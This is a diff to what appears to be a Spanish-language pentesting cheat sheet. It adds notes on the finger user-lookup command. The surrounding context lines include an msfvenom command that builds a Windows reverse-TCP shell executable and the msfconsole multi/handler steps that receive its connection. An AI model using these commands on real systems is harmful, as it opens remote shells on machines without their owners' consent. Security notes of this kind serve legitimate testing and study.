@@ -308,6 +308,11 @@ sudo apt-get install seclists
 
 ++ gpg -c <file> ---> Cifrar archivos 
 
+
+++ finger
+--- sudo apt-get install finger
+--- finger <usuario> ----> Se mostrará la información vinculada al usuario
+
 ++ msfvenom -p /windows/shell/reverse_tcp LHOST=<ip_local> LPORT=4444 -f exe > <nombre_programa>  ---> crear programa intrusion
 ---- msfconsole -q ---> escuchar programa intrusion
 ---- use exploit/multi/handler ---> comando para activar programa intrusion
